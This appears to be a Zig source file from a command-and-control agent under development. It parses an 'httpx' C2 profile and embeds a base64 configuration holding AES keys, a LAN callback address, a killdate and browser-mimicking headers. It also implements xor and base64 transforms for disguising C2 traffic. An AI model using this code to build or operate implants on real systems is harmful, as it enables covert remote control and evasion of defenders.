const std = @import("std");

const TransformOperation = enum {
    base64,
    base64url,
    prepend,
    append,
    xor,
    netbios,
    netbiosu,
};

const HttpxProfile = struct {
    AESPSK: struct {
        value: []const u8,
        enc_key: []const u8,
        dec_key: []const u8,
    },
    callback_domains: [][]const u8,
    callback_host: []const u8,
    callback_interval: u32,
    callback_jitter: u32,
    encrypted_exchange_check: bool,
    domain_rotation: []const u8,
    failover_threshold: u32,
    killdate: []const u8,
    raw_c2_config: []const u8,

    fn formatDomains(writer: *std.Io.Writer, domains: [][]const u8) std.Io.Writer.Error!void {
        try writer.writeAll("[");
        for (domains, 0..) |domain, i| {
            if (i > 0) try writer.writeAll(", ");
            try writer.print("\"{s}\"", .{domain});
        }
        try writer.writeAll("]");
    }

    fn formatRawConfigPreview(writer: *std.Io.Writer, raw_config: []const u8) std.Io.Writer.Error!void {
        const max_preview_len = 120;
        if (raw_config.len <= max_preview_len) {
            try writer.print("\"{s}\"", .{raw_config});
            return;
        }

        try writer.print("\"{s}\"... ({d} bytes)", .{ raw_config[0..max_preview_len], raw_config.len });
    }

    pub fn format(value: @This(), writer: *std.Io.Writer) std.Io.Writer.Error!void {
        const header =
            \\httpx profile
            \\  AESPSK.value: {s}
            \\  AESPSK.enc_key: {s}
            \\  AESPSK.dec_key: {s}
            \\  callback_host: {s}
            \\  callback_interval: {d}
            \\  callback_jitter: {d}
            \\  encrypted_exchange_check: {}
            \\  domain_rotation: {s}
            \\  failover_threshold: {d}
            \\  killdate: {s}
            \\  callback_domains: 
        ;

        try writer.print(header, .{
            value.AESPSK.value,
            value.AESPSK.enc_key,
            value.AESPSK.dec_key,
            value.callback_host,
            value.callback_interval,
            value.callback_jitter,
            value.encrypted_exchange_check,
            value.domain_rotation,
            value.failover_threshold,
            value.killdate,
        });
        try formatDomains(writer, value.callback_domains);
        try writer.writeAll("\n  raw_c2_config: ");
        try formatRawConfigPreview(writer, value.raw_c2_config);
    }
};

const Transform = struct {
    action: []const u8,
    value: ?[]const u8 = null,
};

const Httpx = struct {
    name: []const u8,
    get: struct {
        verb: []const u8,
        uris: [][]const u8,
        client: struct {
            headers: std.json.ArrayHashMap([]const u8),
            domain_specific_headers: ?std.json.Value = null,
            parameters: ?std.json.ArrayHashMap([]const u8) = null,
            message: struct {
                location: []const u8,
                name: []const u8,
            },
            transforms: []Transform,
        },
        server: struct {
            headers: std.json.ArrayHashMap([]const u8),
            parameters: ?std.json.ArrayHashMap([]const u8) = null,
            transforms: []Transform,
        },
    },
    post: struct {
        verb: []const u8,
        uris: [][]const u8,
        client: struct {
            headers: std.json.ArrayHashMap([]const u8),
            domain_specific_headers: ?std.json.Value = null,
            parameters: ?std.json.ArrayHashMap([]const u8) = null,
            message: ?struct {
                location: []const u8,
                name: []const u8,
            } = null,
            transforms: []Transform,
        },
        server: struct {
            headers: std.json.ArrayHashMap([]const u8),
            parameters: ?std.json.ArrayHashMap([]const u8) = null,
            transforms: ?[]Transform = null,
        },
    },

    fn formatUris(writer: *std.Io.Writer, uris: [][]const u8) std.Io.Writer.Error!void {
        try writer.writeAll("[");
        for (uris, 0..) |uri, i| {
            if (i > 0) try writer.writeAll(", ");
            try writer.print("\"{s}\"", .{uri});
        }
        try writer.writeAll("]");
    }

    fn formatTransformValue(writer: *std.Io.Writer, value: ?[]const u8) std.Io.Writer.Error!void {
        if (value) |v| {
            const max_preview_len = 120;
            if (v.len <= max_preview_len) {
                try writer.print("\"{s}\"", .{v});
            } else {
                try writer.print("\"{s}\"... ({d} bytes)", .{ v[0..max_preview_len], v.len });
            }
            return;
        }

        try writer.writeAll("null");
    }

    fn formatTransformEntry(
        writer: *std.Io.Writer,
        index: usize,
        t: Transform,
    ) std.Io.Writer.Error!void {
        const entry_header = "    [{d}] action=\"{s}\", value=";
        try writer.print(entry_header, .{ index, t.action });
        try formatTransformValue(writer, t.value);
        try writer.writeAll("\n");
    }

    fn formatTransformsDetailed(
        writer: *std.Io.Writer,
        label: []const u8,
        transforms: []const Transform,
    ) std.Io.Writer.Error!void {
        const section_header = "  {s}: {d}\n";
        try writer.print(section_header, .{ label, transforms.len });
        for (transforms, 0..) |t, i| {
            try formatTransformEntry(writer, i, t);
        }
    }

    pub fn format(value: @This(), writer: *std.Io.Writer) std.Io.Writer.Error!void {
        const get_block =
            \\httpx "{s}"
            \\  get.verb: {s}
            \\  get.uris: 
        ;

        try writer.print(get_block, .{
            value.name,
            value.get.verb,
        });
        try formatUris(writer, value.get.uris);
        try writer.writeAll("\n");

        try formatTransformsDetailed(writer, "get.client.transforms", value.get.client.transforms);
        try formatTransformsDetailed(writer, "get.server.transforms", value.get.server.transforms);

        const post_block =
            \\  post.verb: {s}
            \\  post.uris: 
        ;
        try writer.print(post_block, .{value.post.verb});
        try formatUris(writer, value.post.uris);
        try writer.writeAll("\n");

        try formatTransformsDetailed(writer, "post.client.transforms", value.post.client.transforms);
        if (value.post.server.transforms) |transforms| {
            try formatTransformsDetailed(writer, "post.server.transforms", transforms);
        } else {
            try writer.writeAll("  post.server.transforms: 0\n");
        }
    }
};

pub fn parseProfileExampleJson(
    allocator: std.mem.Allocator,
    path: []const u8,
) !std.json.Parsed(Httpx) {
    const json_bytes = try std.fs.cwd().readFileAlloc(allocator, path, 1024 * 1024);
    defer allocator.free(json_bytes);

    return std.json.parseFromSlice(Httpx, allocator, json_bytes, .{
        .allocate = .alloc_always,
    });
}

fn applyTransforms(allocator: std.mem.Allocator, data: []const u8, profile: Httpx, method: enum { get, post }, client: bool, encoder: std.base64.Base64Encoder, decoder: std.base64.Base64Decoder) ![]const u8 {
    var transformed_data: []const u8 = try allocator.dupe(u8, data);
    const transforms =
        if (client)
            if (method == .get)
                profile.get.client.transforms
            else
                profile.post.client.transforms
        else if (method == .get)
            profile.get.server.transforms
        else
            profile.post.server.transforms orelse return error.NullTransformList;

    for (transforms) |trans| {
        //std.debug.print("[Transform:GET] {s} : {s}\n", .{ trans.action, trans.value orelse "null" });
        const transform = std.meta.stringToEnum(TransformOperation, trans.action).?;
        switch (transform) {
            .base64 => {
                if (client) {
                    const len = encoder.calcSize(transformed_data.len);
                    const new_data_buf = try allocator.alloc(u8, len);
                    const new = encoder.encode(new_data_buf, transformed_data);
                    allocator.free(transformed_data);
                    transformed_data = new;
                } else {
                    const len = try decoder.calcSizeForSlice(transformed_data);
                    const new_data_buf = try allocator.alloc(u8, len);
                    try decoder.decode(new_data_buf, transformed_data);
                    allocator.free(transformed_data);
                    transformed_data = new_data_buf;
                }
            },
            .base64url => {
                if (client) {
                    const url_safe_encoder = std.base64.Base64Encoder.init(std.base64.url_safe_alphabet_chars, '=');
                    const len = url_safe_encoder.calcSize(transformed_data.len);
                    const new_data_buf = try allocator.alloc(u8, len);
                    const new = url_safe_encoder.encode(new_data_buf, transformed_data);
                    allocator.free(transformed_data);
                    transformed_data = new;
                } else {
                    const url_safe_decoder = std.base64.Base64Decoder.init(std.base64.url_safe_alphabet_chars, '=');
                    const len = try url_safe_decoder.calcSizeForSlice(transformed_data);
                    const new_data_buf = try allocator.alloc(u8, len);
                    try url_safe_decoder.decode(new_data_buf, transformed_data);
                    allocator.free(transformed_data);
                    transformed_data = new_data_buf;
                }
            },
            .prepend => {
                allocator.free(transformed_data);
                transformed_data = try std.mem.concat(allocator, u8, &.{ trans.value orelse return error.NullPrepend, transformed_data });
            },
            .append => {
                allocator.free(transformed_data);
                transformed_data = try std.mem.concat(allocator, u8, &.{ transformed_data, trans.value orelse return error.NullPrepend });
            },
            .xor => {
                const new = try allocator.dupe(u8, transformed_data);
                const key = trans.value orelse return error.NullXORKey;
                var i: u32 = 0;
                for (new) |*char| {
                    char.* = char.* ^ key[i];
                    i += 1;
                    if (i >= key.len) i = 0;
                }
                allocator.free(transformed_data);
                transformed_data = new;
            },
            else => {
                return error.NotImplemented;
            },
        }
    }
    return transformed_data;
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer std.debug.assert(gpa.deinit() == .ok);
    const allocator = gpa.allocator();

    //const encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
    const decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');

    const b64_profile = "eyJBRVNQU0siOnsidmFsdWUiOiJhZXMyNTZfaG1hYyIsImVuY19rZXkiOiJtclhySXVMVm81anpmSVErYmpsajN0QkNuYVlBcTQyVnRhc3dJbStoUStzPSIsImRlY19rZXkiOiJtclhySXVMVm81anpmSVErYmpsajN0QkNuYVlBcTQyVnRhc3dJbStoUStzPSJ9LCJjYWxsYmFja19kb21haW5zIjpbImh0dHA6Ly8xOTIuMTY4LjEuMjEyIl0sImNhbGxiYWNrX2ludGVydmFsIjoxMCwiY2FsbGJhY2tfaml0dGVyIjoyMywiZG9tYWluX3JvdGF0aW9uIjoiZmFpbC1vdmVyIiwiZW5jcnlwdGVkX2V4Y2hhbmdlX2NoZWNrIjpmYWxzZSwiZmFpbG92ZXJfdGhyZXNob2xkIjo1LCJraWxsZGF0ZSI6IjIwMjctMDItMjQiLCJyYXdfYzJfY29uZmlnIjoiZXdvZ0lDSnVZVzFsSWpvZ0lsUkZVMVFpTEFvZ0lDSm5aWFFpT2lCN0NpQWdJQ0FpZG1WeVlpSTZJQ0pIUlZRaUxBb2dJQ0FnSW5WeWFYTWlPaUJiQ2lBZ0lDQWdJQ0l2YlhrdmRYSnBMM0JoZEdnaUNpQWdJQ0JkTEFvZ0lDQWdJbU5zYVdWdWRDSTZJSHNLSUNBZ0lDQWdJbWhsWVdSbGNuTWlPaUI3Q2lBZ0lDQWdJQ0FnSWxWelpYSXRRV2RsYm5RaU9pQWlUVzk2YVd4c1lTODFMakFnS0ZkcGJtUnZkM01nVGxRZ01UQXVNRHNnVjJsdU5qUTdJSGcyTkNrZ1FYQndiR1ZYWldKTGFYUXZOVE0zTGpNMklDaExTRlJOVEN3Z2JHbHJaU0JIWldOcmJ5a2dRMmh5YjIxbEx6RXdOUzR3TGpBdU1DQlRZV1poY21rdk5UTTNMak0ySWdvZ0lDQWdJQ0I5TEFvZ0lDQWdJQ0FpY0dGeVlXMWxkR1Z5Y3lJNklIc0tJQ0FnSUNBZ0lDQWlUWGxMWlhraU9pQWlkbUZzZFdVaUNpQWdJQ0FnSUgwc0NpQWdJQ0FnSUNKa2IyMWhhVzVmYzNCbFkybG1hV05mYUdWaFpHVnljeUk2SUhzS0lDQWdJQ0FnSUNBaWFIUjBjSE02THk5bGVHRnRjR3hsTG1OdmJUbzBORE1pT2lCN0NpQWdJQ0FnSUNBZ0lDQWlWWE5sY2kxQloyVnVkQ0k2SUNKVVpYTjBJZ29nSUNBZ0lDQWdJSDBLSUNBZ0lDQWdmU3dLSUNBZ0lDQWdJbTFsYzNOaFoyVWlPaUI3Q2lBZ0lDQWdJQ0FnSW14dlkyRjBhVzl1SWpvZ0ltTnZiMnRwWlNJc0NpQWdJQ0FnSUNBZ0ltNWhiV1VpT2lBaWMyVnpjMmx2YmtsRUlnb2dJQ0FnSUNCOUxBb2dJQ0FnSUNBaWRISmhibk5tYjNKdGN5STZJRnNLSUNBZ0lDQWdJQ0I3Q2lBZ0lDQWdJQ0FnSUNBaVlXTjBhVzl1SWpvZ0ltSmhjMlUyTkhWeWJDSUtJQ0FnSUNBZ0lDQjlDaUFnSUNBZ0lGMEtJQ0FnSUgwc0NpQWdJQ0FpYzJWeWRtVnlJam9nZXdvZ0lDQWdJQ0FpYUdWaFpHVnljeUk2SUhzS0lDQWdJQ0FnSUNBaVUyVnlkbVZ5SWpvZ0lsTmxjblpsY2lJc0NpQWdJQ0FnSUNBZ0lrTmhZMmhsTFVOdmJuUnliMndpT2lBaWJXRjRMV0ZuWlQwd0xDQnVieTFqWVdOb1pTSUtJQ0FnSUNBZ2ZTd0tJQ0FnSUNBZ0luUnlZVzV6Wm05eWJYTWlPaUJiQ2lBZ0lDQWdJQ0FnZXdvZ0lDQWdJQ0FnSUNBZ0ltRmpkR2x2YmlJNklDSjRiM0lpTEFvZ0lDQWdJQ0FnSUNBZ0luWmhiSFZsSWpvZ0ltdGxlVWhsY21VaUNpQWdJQ0FnSUNBZ2ZTd0tJQ0FnSUNBZ0lDQjdDaUFnSUNBZ0lDQWdJQ0FpWVdOMGFXOXVJam9nSW1KaGMyVTJOSFZ5YkNJS0lDQWdJQ0FnSUNCOUxBb2dJQ0FnSUNBZ0lIc0tJQ0FnSUNBZ0lDQWdJQ0poWTNScGIyNGlPaUFpY0hKbGNHVnVaQ0lzQ2lBZ0lDQWdJQ0FnSUNBaWRtRnNkV1VpT2lBaWUxd2ljbVZ6Y0c5dWMyVmNJanBjSWlJS0lDQWdJQ0FnSUNCOUxBb2dJQ0FnSUNBZ0lIc0tJQ0FnSUNBZ0lDQWdJQ0poWTNScGIyNGlPaUFpWVhCd1pXNWtJaXdLSUNBZ0lDQWdJQ0FnSUNKMllXeDFaU0k2SUNKY0luMGlDaUFnSUNBZ0lDQWdmU3dLSUNBZ0lDQWdJQ0I3Q2lBZ0lDQWdJQ0FnSUNBaVlXTjBhVzl1SWpvZ0ltNWxkR0pwYjNNaUNpQWdJQ0FnSUNBZ2ZRb2dJQ0FnSUNCZENpQWdJQ0I5Q2lBZ2ZTd0tJQ0FpY0c5emRDSTZJSHNLSUNBZ0lDSjFjbWx6SWpvZ1d3b2dJQ0FnSUNBaUwyMTVMMjkwYUdWeUwzQmhkR2dpQ2lBZ0lDQmRMQW9nSUNBZ0luWmxjbUlpT2lBaVVFOVRWQ0lzQ2lBZ0lDQWlZMnhwWlc1MElqb2dld29nSUNBZ0lDQWlhR1ZoWkdWeWN5STZJSHNLSUNBZ0lDQWdJQ0FpVlhObGNpMUJaMlZ1ZENJNklDSk5iM3BwYkd4aEx6VXVNQ0FvVjJsdVpHOTNjeUJPVkNBeE1DNHdPeUJYYVc0Mk5Ec2dlRFkwS1NCQmNIQnNaVmRsWWt0cGRDODFNemN1TXpZZ0tFdElWRTFNTENCc2FXdGxJRWRsWTJ0dktTQkRhSEp2YldVdk1UQTFMakF1TUM0d0lGTmhabUZ5YVM4MU16Y3VNellpTEFvZ0lDQWdJQ0FnSUNKSWIzTjBJam9nSWpFNU1pNHhOamd1TVM0eU1USWlDaUFnSUNBZ0lIMHNDaUFnSUNBZ0lDSjBjbUZ1YzJadmNtMXpJam9nV3dvZ0lDQWdJQ0FnSUhzS0lDQWdJQ0FnSUNBZ0lDSmhZM1JwYjI0aU9pQWllRzl5SWl3S0lDQWdJQ0FnSUNBZ0lDSjJZV3gxWlNJNklDSnJaWGxJWlhKbElnb2dJQ0FnSUNBZ0lIMHNDaUFnSUNBZ0lDQWdld29nSUNBZ0lDQWdJQ0FnSW1GamRHbHZiaUk2SUNKaVlYTmxOalIxY213aUNpQWdJQ0FnSUNBZ2ZRb2dJQ0FnSUNCZENpQWdJQ0I5TEFvZ0lDQWdJbk5sY25abGNpSTZJSHNLSUNBZ0lDQWdJbWhsWVdSbGNuTWlPaUI3Q2lBZ0lDQWdJQ0FnSWt0bFpYQXRRV3hwZG1VaU9pQWlkSEoxWlNJS0lDQWdJQ0FnZlN3S0lDQWdJQ0FnSW5SeVlXNXpabTl5YlhNaU9pQmJDaUFnSUNBZ0lDQWdld29nSUNBZ0lDQWdJQ0FnSW1GamRHbHZiaUk2SUNKaVlYTmxOalIxY213aUNpQWdJQ0FnSUNBZ2ZTd0tJQ0FnSUNBZ0lDQjdDaUFnSUNBZ0lDQWdJQ0FpWVdOMGFXOXVJam9nSW5odmNpSXNDaUFnSUNBZ0lDQWdJQ0FpZG1Gc2RXVWlPaUFpYTJWNVNHVnlaU0lLSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJRjBLSUNBZ0lIMEtJQ0I5Q24wSyJ9";

    var profile_buf: [1024 * 4]u8 = undefined;
    const profile_size = try decoder.calcSizeForSlice(b64_profile);
    try decoder.decode(&profile_buf, b64_profile);
    const profile_raw = profile_buf[0..profile_size];

    const profile_parsed = try std.json.parseFromSlice(HttpxProfile, allocator, profile_raw, .{ .allocate = .alloc_always });
    std.debug.print("{f}\n", .{profile_parsed});

    //const data = "U3VwZXIgc2lsbHkgZGF0YSBmb3Igc29tZSBzdXBlciBzaWxseXdhcmUK";
    //var parsed = try parseProfileExampleJson(allocator, std.mem.span(std.os.argv[1]));
    //defer parsed.deinit();

    //std.debug.print("{f}\n\n", .{parsed.value});

    //std.debug.print("[Original] {s}\n", .{data});
    ////const transformed_data = try applyTransforms(allocator, data, parsed.value, .post, encoder);
    //const transformed_data = try applyTransforms(allocator, data, parsed.value, .post, true, encoder, decoder);
    //defer allocator.free(transformed_data);
    //std.debug.print("[Transformed] {s}\n", .{transformed_data});

    //const detransformed_data = try applyTransforms(allocator, transformed_data, parsed.value, .post, false, encoder, decoder);
    //defer allocator.free(detransformed_data);
    //std.debug.print("[Detransformed] {s}\n", .{detransformed_data});
}
